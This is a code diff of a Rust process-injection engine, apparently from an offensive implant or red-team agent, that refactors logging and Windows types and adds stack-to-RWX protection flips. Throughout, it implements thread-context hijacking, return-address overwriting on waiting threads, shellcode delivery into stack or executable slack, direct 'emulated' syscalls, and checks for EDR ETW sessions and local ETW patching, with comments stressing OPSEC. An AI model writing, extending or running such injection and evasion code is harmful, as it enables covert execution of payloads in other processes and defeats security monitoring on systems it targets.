@@ -7821,6 +8118,7 @@ struct SystemThreadInformation {
 ///
 /// If CONTEXT-only fails (no suitable threads, can't write), falls back to
 /// `ThreadHijack` technique.
+#[cfg(feature = "context-only")]
 fn inject_context_only(
     pid: u32,
     target_tid: Option<u32>,
@@ -7854,8 +8152,8 @@ fn inject_context_only(
         // PROCESS_QUERY_INFORMATION for thread enumeration.
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_proc: usize = 0;
         // PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION
@@ -7894,7 +8192,7 @@ fn inject_context_only(
                     Some(tid) => tid,
                     None => {
                         // No suitable thread found — fall back to ThreadHijack.
-                        log::warn!(
+                        tracing::warn!(
                             "injection_engine: ContextOnly: no suitable thread in pid {}, \
                              falling back to ThreadHijack",
                             pid,
@@ -7906,7 +8204,7 @@ fn inject_context_only(
             }
         };
 
-        log::info!(
+        tracing::info!(
             "injection_engine: ContextOnly: selected thread {} in pid {}",
             candidate_tid,
             pid,
@@ -7920,8 +8218,8 @@ fn inject_context_only(
         thread_client_id[0] = pid as u64;
         thread_client_id[1] = candidate_tid as u64;
 
-        let mut obj_attr2: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr2.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr2: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr2.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_thread: usize = 0;
         let open_thread_status = crate::emulated_syscall!(
@@ -7938,8 +8236,8 @@ fn inject_context_only(
         let h_thread = h_thread as *mut c_void;
 
         // ── Step 4: Snapshot the thread's current CONTEXT ───────────────
-        let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
-        ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
+        let mut ctx: crate::win_types::CONTEXT = std::mem::zeroed();
+        ctx.ContextFlags = crate::win_types::CONTEXT_FULL;
 
         let get_ctx_status = crate::emulated_syscall!(
             "NtGetContextThread",
@@ -7956,7 +8254,7 @@ fn inject_context_only(
         let original_sp = context_sp(&ctx);
         let original_fp = context_fp(&ctx);
 
-        log::debug!(
+        tracing::debug!(
             "injection_engine: ContextOnly: thread {} original context: IP={:#x} SP={:#x} FP={:#x}",
             candidate_tid,
             original_ip,
@@ -8009,7 +8307,7 @@ fn inject_context_only(
             // Align down to 16 bytes for stack alignment.
             let stack_write_addr = stack_write_addr & !0xF;
 
-            log::debug!(
+            tracing::debug!(
                 "injection_engine: ContextOnly: Method A (stack), writing {} bytes at {:#x} \
                  (SP={:#x}, offset=0x{:x})",
                 combined_len,
@@ -8029,7 +8327,7 @@ fn inject_context_only(
 
             match find_executable_slack(h_proc, combined_len) {
                 Some(addr) => {
-                    log::debug!(
+                    tracing::debug!(
                         "injection_engine: ContextOnly: Method B (section), writing {} bytes \
                          at {:#x} in existing executable region",
                         combined_len,
@@ -8073,12 +8371,51 @@ fn inject_context_only(
             ));
         }
 
-        log::info!(
+        tracing::info!(
             "injection_engine: ContextOnly: wrote {} bytes at {:#x} via {} delivery",
             combined_len,
             write_addr,
             delivery_method,
         );
+
+        // ── Step 5b: Make stack executable for stack delivery ────────────
+        //
+        // Stack pages are PAGE_READWRITE by default — non-executable due to
+        // DEP/NX. Before we redirect execution to the payload on the stack,
+        // we must flip the protection to PAGE_EXECUTE_READWRITE so the CPU
+        // can fetch instructions from it. We save the old protection so we
+        // can restore it in cleanup.
+        let mut stack_old_prot: u32 = 0;
+
+        if delivery_method.starts_with("stack") {
+            let mut prot_base = write_addr;
+            let mut prot_size = combined_len;
+            let prot_status = crate::emulated_syscall!(
+                "NtProtectVirtualMemory",
+                h_proc as u64,
+                &mut prot_base as *mut _ as u64,
+                &mut prot_size as *mut _ as u64,
+                0x40u64, // PAGE_EXECUTE_READWRITE
+                &mut stack_old_prot as *mut _ as u64,
+            );
+
+            let prot_ok = prot_status.as_ref().map_or(false, |&s| s >= 0);
+            if !prot_ok {
+                tracing::warn!(
+                    "injection_engine: ContextOnly: NtProtectVirtualMemory(RWX) failed for \
+                     stack at {:#x} — payload will likely AV on NX violation (status={:?})",
+                    write_addr,
+                    prot_status,
+                );
+            } else {
+                tracing::debug!(
+                    "injection_engine: ContextOnly: flipped stack {:#x}+{} to RWX (was {:#x})",
+                    prot_base,
+                    prot_size,
+                    stack_old_prot,
+                );
+            }
+        }
 
         // ── Step 6: Modify the thread's CONTEXT ─────────────────────────
         //
@@ -8124,7 +8461,7 @@ fn inject_context_only(
             cleanup_and_err!("NtSetContextThread failed");
         }
 
-        log::info!(
+        tracing::info!(
             "injection_engine: ContextOnly: set thread {} IP={:#x}, SP={:#x}",
             candidate_tid,
             context_ip(&ctx),
@@ -8145,7 +8482,7 @@ fn inject_context_only(
         );
 
         if resume_status.is_ok() && resume_status.unwrap() >= 0 && suspend_count > 0 {
-            log::info!(
+            tracing::info!(
                 "injection_engine: ContextOnly: resumed thread {} (suspend count was {})",
                 candidate_tid,
                 suspend_count,
@@ -8157,12 +8494,12 @@ fn inject_context_only(
             // RIP when the wait resolves naturally.
             let alert_status = crate::emulated_syscall!("NtAlertThread", h_thread as u64,);
             if alert_status.is_ok() && alert_status.unwrap() >= 0 {
-                log::info!(
+                tracing::info!(
                     "injection_engine: ContextOnly: alerted thread {} to break wait",
                     candidate_tid,
                 );
             } else {
-                log::debug!(
+                tracing::debug!(
                     "injection_engine: ContextOnly: thread {} not suspended/alertable; \
                      context modified, will execute when wait resolves",
                     candidate_tid,
@@ -8187,8 +8524,8 @@ fn inject_context_only(
         std::thread::sleep(std::time::Duration::from_millis(100));
 
         while wait_start.elapsed() < wait_timeout {
-            let mut check_ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
-            check_ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL;
+            let mut check_ctx: crate::win_types::CONTEXT = std::mem::zeroed();
+            check_ctx.ContextFlags = crate::win_types::CONTEXT_CONTROL;
 
             let check_status = crate::emulated_syscall!(
                 "NtGetContextThread",
@@ -8216,13 +8553,13 @@ fn inject_context_only(
         }
 
         if payload_completed {
-            log::info!(
+            tracing::info!(
                 "injection_engine: ContextOnly: payload completed in thread {} after {}ms",
                 candidate_tid,
                 wait_start.elapsed().as_millis(),
             );
         } else {
-            log::warn!(
+            tracing::warn!(
                 "injection_engine: ContextOnly: payload may still be executing in thread {} \
                  after 10s timeout — context was modified successfully",
                 candidate_tid,
@@ -8231,9 +8568,29 @@ fn inject_context_only(
 
         // ── Step 9: Cleanup ─────────────────────────────────────────────
         //
-        // For stack-based delivery: zero out the payload bytes on the stack
-        // via NtWriteVirtualMemory (write zeros).
+        // For stack-based delivery: restore original page protection and
+        // zero out the payload bytes on the stack.
         if delivery_method.starts_with("stack") {
+            // Restore original (non-executable) protection before zeroing.
+            if stack_old_prot != 0 {
+                let mut restore_base = write_addr;
+                let mut restore_size = combined_len;
+                let mut dummy_prot = 0u32;
+                let _ = crate::emulated_syscall!(
+                    "NtProtectVirtualMemory",
+                    h_proc as u64,
+                    &mut restore_base as *mut _ as u64,
+                    &mut restore_size as *mut _ as u64,
+                    stack_old_prot as u64,
+                    &mut dummy_prot as *mut _ as u64,
+                );
+                tracing::debug!(
+                    "injection_engine: ContextOnly: restored stack protection to {:#x} at {:#x}",
+                    stack_old_prot,
+                    write_addr,
+                );
+            }
+
             let zero_buf = vec![0u8; combined_len];
             let mut zero_written = 0usize;
             let _ = crate::emulated_syscall!(
@@ -8244,7 +8601,7 @@ fn inject_context_only(
                 combined_len as u64,
                 &mut zero_written as *mut _ as u64,
             );
-            log::debug!(
+            tracing::debug!(
                 "injection_engine: ContextOnly: zeroed {} bytes on stack at {:#x}",
                 zero_written,
                 write_addr,
@@ -8270,67 +8627,68 @@ fn inject_context_only(
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn context_ip(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+fn context_ip(ctx: &crate::win_types::CONTEXT) -> u64 {
     ctx.Rip
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn context_ip(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+fn context_ip(ctx: &crate::win_types::CONTEXT) -> u64 {
     ctx.Pc
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn set_context_ip(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+fn set_context_ip(ctx: &mut crate::win_types::CONTEXT, value: u64) {
     ctx.Rip = value;
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn set_context_ip(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+fn set_context_ip(ctx: &mut crate::win_types::CONTEXT, value: u64) {
     ctx.Pc = value;
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn context_sp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+fn context_sp(ctx: &crate::win_types::CONTEXT) -> u64 {
     ctx.Rsp
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn context_sp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+fn context_sp(ctx: &crate::win_types::CONTEXT) -> u64 {
     ctx.Sp
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn set_context_sp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+fn set_context_sp(ctx: &mut crate::win_types::CONTEXT, value: u64) {
     ctx.Rsp = value;
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn set_context_sp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+fn set_context_sp(ctx: &mut crate::win_types::CONTEXT, value: u64) {
     ctx.Sp = value;
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn context_fp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+fn context_fp(ctx: &crate::win_types::CONTEXT) -> u64 {
     ctx.Rbp
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn context_fp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+fn context_fp(ctx: &crate::win_types::CONTEXT) -> u64 {
     unsafe { ctx.u.s().Fp }
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn set_context_fp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+fn set_context_fp(ctx: &mut crate::win_types::CONTEXT, value: u64) {
     ctx.Rbp = value;
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn set_context_fp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+fn set_context_fp(ctx: &mut crate::win_types::CONTEXT, value: u64) {
     unsafe {
         ctx.u.s_mut().Fp = value;
     }
 }
 
+#[cfg(all(windows, target_arch = "aarch64"))]
 #[cfg(all(windows, target_arch = "aarch64"))]
 fn emit_aarch64_mov_imm64(out: &mut Vec<u8>, reg: u32, value: u64) {
     let parts = [
@@ -8415,14 +8773,15 @@ fn build_restore_trampoline_x86_64(
 /// Used by `inject_thread_hijack` when no alertable thread is available.
 /// Opens the first thread that can be opened with THREAD_GET_CONTEXT |
 /// THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME access.
+#[cfg(feature = "thread-hijack")]
 unsafe fn find_any_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut c_void, u32)> {
     let tid = find_best_thread(pid)?;
     let thread_access: u64 = 0x0008 | 0x0010 | 0x0002; // GET_CONTEXT | SET_CONTEXT | SUSPEND_RESUME
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
     client_id[1] = tid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_thread: usize = 0;
     let status = crate::emulated_syscall!(
@@ -8653,9 +9012,7 @@ fn find_best_thread(target_pid: u32) -> Option<u32> {
 /// Returns the address of the slack region, or `None` if no suitable region
 /// is found.
 unsafe fn find_executable_slack(h_proc: *mut c_void, required_size: usize) -> Option<usize> {
-    use winapi::um::winnt::{
-        MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ,
-    };
+    use windows_sys::Win32::System::Memory::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ};
 
     let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
     let mut addr: usize = 0x10000; // Start scanning from 64KB (skip null page)
@@ -8723,7 +9080,7 @@ unsafe fn find_executable_slack(h_proc: *mut c_void, required_size: usize) -> Op
                             // Verify the slack is not at the very start of the region
                             // (which would be a PE header).
                             if slack_addr > region_base + 0x1000 {
-                                log::debug!(
+                                tracing::debug!(
                                     "injection_engine: ContextOnly: found {} bytes of slack \
                                      at {:#x} in executable region {:#x}",
                                     slack_len,
@@ -8832,6 +9189,7 @@ struct WaitingThreadCandidate {
 ///
 /// If WTH fails (no waiting threads, stack read fails, can't find return
 /// address), falls back to `ContextOnly`, then `ThreadHijack`.
+#[cfg(feature = "thread-hijack")]
 fn inject_waiting_thread_hijack(
     pid: u32,
     target_tid: Option<u32>,
@@ -8862,8 +9220,8 @@ fn inject_waiting_thread_hijack(
         // ── Step 1: Open target process ─────────────────────────────────
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_proc: usize = 0;
         // PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
@@ -8916,7 +9274,7 @@ fn inject_waiting_thread_hijack(
                     None => {
                         // No suitable waiting thread found — fall back to
                         // ContextOnly, then ThreadHijack.
-                        log::warn!(
+                        tracing::warn!(
                             "injection_engine: WTH: no suitable waiting thread in pid {}, \
                              falling back to ContextOnly",
                             pid,
@@ -8929,7 +9287,7 @@ fn inject_waiting_thread_hijack(
             }
         };
 
-        log::info!(
+        tracing::info!(
             "injection_engine: WTH: selected thread {} in pid {} (wait_reason={}, score={})",
             candidate.tid,
             pid,
@@ -8949,8 +9307,8 @@ fn inject_waiting_thread_hijack(
         thread_client_id[0] = pid as u64;
         thread_client_id[1] = candidate.tid as u64;
 
-        let mut obj_attr2: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr2.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr2: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr2.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_thread: usize = 0;
         let open_thread_status = crate::emulated_syscall!(
@@ -8971,8 +9329,8 @@ fn inject_waiting_thread_hijack(
         // We use NtGetContextThread only to read the current stack pointer — we do
         // NOT modify the CONTEXT (no NtSetContextThread call). This is
         // critical for OPSEC.
-        let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
-        ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL; // Only control registers
+        let mut ctx: crate::win_types::CONTEXT = std::mem::zeroed();
+        ctx.ContextFlags = crate::win_types::CONTEXT_CONTROL; // Only control registers
 
         let get_ctx_status = crate::emulated_syscall!(
             "NtGetContextThread",
@@ -8987,7 +9345,7 @@ fn inject_waiting_thread_hijack(
 
         let thread_rsp = context_sp(&ctx);
 
-        log::debug!(
+        tracing::debug!(
             "injection_engine: WTH: thread {} SP={:#x}",
             candidate.tid,
             thread_rsp,
@@ -9036,7 +9394,7 @@ fn inject_waiting_thread_hijack(
             None => {
                 // Could not identify the return address.
                 // Fall back to ContextOnly → ThreadHijack.
-                log::warn!(
+                tracing::warn!(
                     "injection_engine: WTH: could not identify return address on thread {} stack, \
                      falling back to ContextOnly",
                     candidate.tid,
@@ -9050,7 +9408,7 @@ fn inject_waiting_thread_hijack(
 
         let return_addr_stack_location = thread_rsp + return_addr_offset as u64;
 
-        log::info!(
+        tracing::info!(
             "injection_engine: WTH: found return address {:#x} at stack offset +{:#x} \
              (RSP={:#x}, stack_loc={:#x})",
             original_return_addr,
@@ -9086,7 +9444,7 @@ fn inject_waiting_thread_hijack(
                 cleanup_and_err!("stack too small for WTH payload delivery");
             };
 
-            log::debug!(
+            tracing::debug!(
                 "injection_engine: WTH: Method A (stack), writing {} bytes at {:#x}",
                 combined_len,
                 stack_write_addr,
@@ -9096,7 +9454,7 @@ fn inject_waiting_thread_hijack(
             // Method B: Section-based delivery.
             match find_executable_slack(h_proc, combined_len) {
                 Some(addr) => {
-                    log::debug!(
+                    tracing::debug!(
                         "injection_engine: WTH: Method B (section), writing {} bytes at {:#x}",
                         combined_len,
                         addr,
@@ -9135,12 +9493,50 @@ fn inject_waiting_thread_hijack(
             ));
         }
 
-        log::info!(
+        tracing::info!(
             "injection_engine: WTH: wrote {} bytes at {:#x} via {} delivery",
             combined_len,
             write_addr,
             delivery_method,
         );
+
+        // ── Step 6b: Make stack executable for stack delivery ────────────
+        //
+        // Stack pages are PAGE_READWRITE by default — non-executable due to
+        // DEP/NX. Before we overwrite the return address to point to the
+        // payload on the stack, we must flip the protection to
+        // PAGE_EXECUTE_READWRITE so the CPU can fetch instructions from it.
+        let mut wth_stack_old_prot: u32 = 0;
+
+        if delivery_method.starts_with("stack") {
+            let mut prot_base = write_addr;
+            let mut prot_size = combined_len;
+            let prot_status = crate::emulated_syscall!(
+                "NtProtectVirtualMemory",
+                h_proc as u64,
+                &mut prot_base as *mut _ as u64,
+                &mut prot_size as *mut _ as u64,
+                0x40u64, // PAGE_EXECUTE_READWRITE
+                &mut wth_stack_old_prot as *mut _ as u64,
+            );
+
+            let prot_ok = prot_status.as_ref().map_or(false, |&s| s >= 0);
+            if !prot_ok {
+                tracing::warn!(
+                    "injection_engine: WTH: NtProtectVirtualMemory(RWX) failed for \
+                     stack at {:#x} — payload will likely AV on NX violation (status={:?})",
+                    write_addr,
+                    prot_status,
+                );
+            } else {
+                tracing::debug!(
+                    "injection_engine: WTH: flipped stack {:#x}+{} to RWX (was {:#x})",
+                    prot_base,
+                    prot_size,
+                    wth_stack_old_prot,
+                );
+            }
+        }
 
         // ── Step 7: Overwrite the return address on the stack ───────────
         //
@@ -9173,7 +9569,7 @@ fn inject_waiting_thread_hijack(
             cleanup_and_err!("NtWriteVirtualMemory (return address overwrite) failed");
         }
 
-        log::info!(
+        tracing::info!(
             "injection_engine: WTH: overwrote return address at {:#x} with payload addr {:#x}",
             return_addr_stack_location,
             write_addr,
@@ -9193,13 +9589,13 @@ fn inject_waiting_thread_hijack(
         // option. The thread will wake and execute our payload when its wait
         // completes.
         if candidate.wait_reason == KTHREAD_WAIT_REASON_WR_DELAY_EXECUTION {
-            log::info!(
+            tracing::info!(
                 "injection_engine: WTH: thread {} in DelayExecution wait — \
                  will wake naturally and execute payload",
                 candidate.tid,
             );
         } else {
-            log::info!(
+            tracing::info!(
                 "injection_engine: WTH: thread {} in wait state {} — \
                  will execute payload when wait resolves",
                 candidate.tid,
@@ -9218,8 +9614,8 @@ fn inject_waiting_thread_hijack(
         std::thread::sleep(std::time::Duration::from_millis(100));
 
         while wait_start.elapsed() < wait_timeout {
-            let mut check_ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
-            check_ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL;
+            let mut check_ctx: crate::win_types::CONTEXT = std::mem::zeroed();
+            check_ctx.ContextFlags = crate::win_types::CONTEXT_CONTROL;
 
             let check_status = crate::emulated_syscall!(
                 "NtGetContextThread",
@@ -9245,13 +9641,13 @@ fn inject_waiting_thread_hijack(
         }
 
         if payload_completed {
-            log::info!(
+            tracing::info!(
                 "injection_engine: WTH: payload completed in thread {} after {}ms",
                 candidate.tid,
                 wait_start.elapsed().as_millis(),
             );
         } else {
-            log::warn!(
+            tracing::warn!(
                 "injection_engine: WTH: payload may still be executing in thread {} \
                  after 15s timeout — return address was modified successfully",
                 candidate.tid,
@@ -9260,6 +9656,27 @@ fn inject_waiting_thread_hijack(
 
         // ── Step 10: Cleanup ────────────────────────────────────────────
         //
+        // For stack-based delivery: restore original (non-executable) page
+        // protection, then zero out the payload bytes.
+        if delivery_method.starts_with("stack") && wth_stack_old_prot != 0 {
+            let mut restore_base = write_addr;
+            let mut restore_size = combined_len;
+            let mut dummy_prot = 0u32;
+            let _ = crate::emulated_syscall!(
+                "NtProtectVirtualMemory",
+                h_proc as u64,
+                &mut restore_base as *mut _ as u64,
+                &mut restore_size as *mut _ as u64,
+                wth_stack_old_prot as u64,
+                &mut dummy_prot as *mut _ as u64,
+            );
+            tracing::debug!(
+                "injection_engine: WTH: restored stack protection to {:#x} at {:#x}",
+                wth_stack_old_prot,
+                write_addr,
+            );
+        }
+
         // Zero out the payload bytes on the stack/section.
         let zero_buf = vec![0u8; combined_len];
         let mut zero_written = 0usize;
@@ -9285,7 +9702,7 @@ fn inject_waiting_thread_hijack(
             &mut restore_written as *mut _ as u64,
         );
 
-        log::debug!(
+        tracing::debug!(
             "injection_engine: WTH: restored original return address {:#x} at {:#x}",
             original_return_addr,
             return_addr_stack_location,
@@ -9506,14 +9923,14 @@ unsafe fn find_return_address_on_stack(
     // within the ntdll module range.
     //
     // First, determine ntdll's size by querying its memory region.
-    let mut mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+    let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
     let query_status = crate::emulated_syscall!(
         "NtQueryVirtualMemory",
         h_proc as u64,
         ntdll_base as u64,
         0u64, // MemoryBasicInformation
         &mut mbi as *mut _ as u64,
-        std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>() as u64,
+        std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>() as u64,
         0u64,
     );
 
@@ -9552,7 +9969,7 @@ unsafe fn find_return_address_on_stack(
 
         // Check if within ntdll range — this is the most reliable indicator.
         if val as usize >= ntdll_base && (val as usize) < ntdll_end {
-            log::debug!(
+            tracing::debug!(
                 "injection_engine: WTH: found ntdll return address at stack offset +{:#x}: {:#x}",
                 i * 8,
                 val,
@@ -9567,24 +9984,24 @@ unsafe fn find_return_address_on_stack(
         if val > 0x0000_0001_0000_0000 && (val & 0xF) < 4 {
             // Could be a return address to application code. Verify it's in
             // an executable region.
-            let mut check_mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+            let mut check_mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
             let check_status = crate::emulated_syscall!(
                 "NtQueryVirtualMemory",
                 h_proc as u64,
                 val as u64,
                 0u64,
                 &mut check_mbi as *mut _ as u64,
-                std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>() as u64,
+                std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>() as u64,
                 0u64,
             );
 
             if check_status.is_ok() && check_status.unwrap() >= 0 {
                 let protect = check_mbi.Protect;
-                if protect == winapi::um::winnt::PAGE_EXECUTE
-                    || protect == winapi::um::winnt::PAGE_EXECUTE_READ
-                    || protect == winapi::um::winnt::PAGE_EXECUTE_READWRITE
+                if protect == windows_sys::Win32::System::Memory::PAGE_EXECUTE
+                    || protect == windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ
+                    || protect == windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE
                 {
-                    log::debug!(
+                    tracing::debug!(
                         "injection_engine: WTH: found executable return address at stack offset +{:#x}: {:#x}",
                         i * 8,
                         val,
@@ -9614,6 +10031,7 @@ unsafe fn find_return_address_on_stack(
 ///   ret                      → C3
 ///
 /// Total: 4 + 10 + 4 + 1 = 19 bytes
+#[cfg(feature = "thread-hijack")]
 fn build_wth_trampoline(original_return_addr: u64) -> Vec<u8> {
     let mut trampoline = Vec::with_capacity(19);
 
@@ -9673,7 +10091,7 @@ fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
     // If the agent has already patched ETW locally, any ETW enumeration
     // result would be unreliable — our own ETW writes are silenced.
     if crate::etw_patch::is_etw_patched() {
-        log::debug!("injection_engine: ETW already patched locally; returning EtwStatus::Unknown");
+        tracing::debug!("injection_engine: ETW already patched locally; returning EtwStatus::Unknown");
         return Ok(EtwStatus::Unknown);
     }
 
@@ -9682,7 +10100,7 @@ fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
             if providers.is_empty() {
                 Ok(EtwStatus::Safe)
             } else {
-                log::warn!(
+                tracing::warn!(
                     "injection_engine: EDR auto-logger sessions detected: {:?}",
                     providers,
                 );
@@ -9690,7 +10108,7 @@ fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
             }
         }
         Err(e) => {
-            log::debug!(
+            tracing::debug!(
                 "injection_engine: auto-logger enumeration failed ({}); returning Unknown",
                 e,
             );
@@ -9745,7 +10163,7 @@ const VALUE_INFO_BUF_SIZE: usize = 16;
 /// Registry access mask for NtOpenKey: KEY_READ (enumerate + query).
 #[cfg(feature = "etw-check")]
 const KEY_READ_MASK: u32 =
-    winapi::um::winnt::STANDARD_RIGHTS_READ | 0x0001 | 0x0008 | winapi::um::winnt::SYNCHRONIZE;
+    windows_sys::Win32::Security::STANDARD_RIGHTS_READ | 0x0001 | 0x0008 | 0x00100000; // SYNCHRONIZE
 
 /// Enumerate ETW auto-logger sessions via the registry and check whether
 /// any known EDR sessions are enabled.
@@ -9765,7 +10183,7 @@ const KEY_READ_MASK: u32 =
 /// Windows x86-64 with the nt_syscall infrastructure initialized.
 #[cfg(feature = "etw-check")]
 unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
-    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, UNICODE_STRING};
+    use crate::win_types::{OBJECT_ATTRIBUTES, UNICODE_STRING};
 
     // ── Build the registry path as a wide string ────────────────────────
     //
@@ -9948,16 +10366,15 @@ unsafe fn alloc_write_exec(
     pid: u32,
     payload: &[u8],
 ) -> Result<(*mut c_void, usize), InjectionError> {
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
-        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
-    };
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
+    use crate::win_types::PAGE_READWRITE;
 
     // Open target process.
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
     let access_mask = (PROCESS_VM_OPERATION
@@ -9974,7 +10391,7 @@ unsafe fn alloc_write_exec(
 
     if open_status.is_err() || open_status.unwrap() < 0 || h_proc == 0 {
         return Err(InjectionError::InjectionFailed {
-            technique: InjectionTechnique::ThreadHijack,
+            technique: InjectionTechnique::ProcessHollow,
             reason: "NtOpenProcess failed".to_string(),
         });
     }
@@ -10005,7 +10422,7 @@ unsafe fn alloc_write_exec(
     );
     if s.is_err() || s.unwrap() < 0 || remote_mem.is_null() {
         cleanup_and_err!(
-            InjectionTechnique::ThreadHijack,
+            InjectionTechnique::ProcessHollow,
             "NtAllocateVirtualMemory failed"
         );
     }
@@ -10022,7 +10439,7 @@ unsafe fn alloc_write_exec(
     );
     if s.is_err() || s.unwrap() < 0 || written != payload.len() {
         cleanup_and_err!(
-            InjectionTechnique::ThreadHijack,
+            InjectionTechnique::ProcessHollow,
             "NtWriteVirtualMemory failed"
         );
     }
@@ -10041,7 +10458,7 @@ unsafe fn alloc_write_exec(
     );
     if s.is_err() || s.unwrap() < 0 {
         cleanup_and_err!(
-            InjectionTechnique::ThreadHijack,
+            InjectionTechnique::ProcessHollow,
             "NtProtectVirtualMemory to RX failed"
         );
     }
@@ -10073,7 +10490,7 @@ unsafe fn create_suspended_thread(
     let ntdll_base =
         pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).ok_or_else(|| {
